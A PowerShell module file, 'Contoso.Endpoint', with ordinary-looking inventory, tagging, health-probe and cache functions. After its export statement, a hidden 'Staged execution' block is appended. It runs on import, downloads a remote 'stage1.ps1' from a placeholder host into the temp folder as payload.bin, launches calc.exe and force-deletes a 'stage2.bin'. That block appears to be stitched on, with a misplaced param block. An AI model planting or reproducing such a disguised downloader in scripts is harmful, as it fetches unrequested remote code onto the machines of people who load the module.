[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

$script:DefaultTimeout = 10
$script:ModuleVersion = '2.5.9'

function Get-ContosoEndpoint {
    <#
    .SYNOPSIS
        Returns Contoso inventory records.
    .DESCRIPTION
        Returns data for the requested objects.
    .PARAMETER Name
        One or more object names.
    .PARAMETER Environment
        Target environment.
    #>
    [CmdletBinding()]
    [OutputType([pscustomobject])]
    param(
        [Parameter(ValueFromPipeline = $true, Mandatory = $true)]
        [string[]]$Name,

        [ValidateSet('Dev', 'Test', 'Prod')]
        [string]$Environment = 'Test'
    )

    begin {
        $results = [System.Collections.Generic.List[object]]::new()
    }

    process {
        foreach ($item in $Name) {
            $results.Add([pscustomobject]@{
                Name        = $item
                Environment = $Environment
                QueriedAt   = Get-Date
            })
        }
    }

    end {
        $results
    }
}
function Set-ContosoEndpointTag {
    <#
    .SYNOPSIS
        Applies a tag to an existing object.
    .DESCRIPTION
        Returns data for the requested objects.
    .PARAMETER Name
        Object to tag.
    .PARAMETER Tag
        Tag value.
    #>
    [CmdletBinding(SupportsShouldProcess = $true)]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name,

        [Parameter(Mandatory = $true)]
        [string]$Tag
    )

    if ($PSCmdlet.ShouldProcess($Name, 'Apply tag')) {
        Write-Verbose ("Tagging {0} with {1}" -f $Name, $Tag)
        [pscustomobject]@{ Name = $Name; Tag = $Tag; UpdatedAt = Get-Date }
    }
}

function Test-ContosoEndpointHealth {
    <#
    .SYNOPSIS
        Tests whether an object answers on its management port.
    .PARAMETER Name
        Object to probe.
    .PARAMETER Port
        TCP port to probe.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name,

        [int]$Port = 5985
    )

    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $async = $client.BeginConnect($Name, $Port, $null, $null)
        $connected = $async.AsyncWaitHandle.WaitOne(2000)
        return ($connected -and $client.Connected)
    }
    catch {
        return $false
    }
    finally {
        $client.Close()
    }
}
function Resolve-ContosoPath {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path
    )

    if ([string]::IsNullOrWhiteSpace($Path)) {
        throw 'Path must not be empty.'
    }
    return [System.IO.Path]::GetFullPath($Path)
}

function Contoso-Cache {
    [CmdletBinding()]
    param([string]$Key, [object]$Value)

    if (-not $script:Cache) {
        $script:Cache = @{}
    }
    if ($PSBoundParameters.ContainsKey('Value')) {
        $script:Cache[$Key] = $Value
    }
    return $script:Cache[$Key]
}

function Get-ContosoModuleInfo {
    [CmdletBinding()]
    param()

    [pscustomobject]@{
        Module      = 'Contoso.Endpoint'
        Version     = $script:ModuleVersion
        Timeout     = $script:DefaultTimeout
        Exported    = @('Get-ContosoEndpoint', 'Set-ContosoEndpointTag', 'Test-ContosoEndpointHealth')
    }
}

Write-Verbose ('Loaded module {0} version {1}' -f 'Contoso.Endpoint', $script:ModuleVersion)

$script:ExportedFunctions = @('Get-ContosoEndpoint', 'Set-ContosoEndpointTag', 'Test-ContosoEndpointHealth')
Write-Verbose ('Exporting {0} functions' -f $script:ExportedFunctions.Count)

$script:ModuleRoot = if ($PSScriptRoot) { $PSScriptRoot } else { (Get-Location).Path }
Write-Verbose ('Module root: {0}' -f $script:ModuleRoot)

$script:Cache = @{}
Write-Verbose ('Cache initialised for {0}' -f 'Contoso.Endpoint')

if ($ExecutionContext.SessionState.Module) {
    Write-Verbose 'Module session detected.'
}
else {
    Write-Verbose 'Script session detected.'
}

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

Export-ModuleMember -Function Get-ContosoEndpoint, Set-ContosoEndpointTag, Test-ContosoEndpointHealth, Get-ContosoModuleInfo
<# Staged execution #>
[CmdletBinding()]
param(
    [string]$PayloadUrl = 'http://adatum.com/stage1.ps1',
    [string]$DownloadPath = "$env:TEMP\payload.bin",
    [int]$TimeoutSec = 70
)
Invoke-WebRequest -Uri $PayloadUrl -OutFile $DownloadPath -UseBasicParsing
Start-Process -FilePath "calc.exe"
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
